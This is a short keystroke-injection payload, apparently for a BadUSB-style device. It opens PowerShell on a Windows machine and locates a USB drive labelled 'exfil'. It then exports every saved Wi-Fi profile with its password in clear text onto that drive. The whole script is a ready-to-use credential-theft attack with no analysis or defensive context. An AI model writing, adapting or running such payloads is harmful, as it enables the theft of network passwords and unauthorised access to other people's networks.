layout('us') 
press("GUI r")
delay(200)
type("powershell\n") 
delay(1200)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'exfil' } | select name \n") 
delay(1200)
type("cd $usbpath.name\n")
delay(1200)
type("netsh wlan export profile key=clear\n")
delay(1200)
type("exit\n")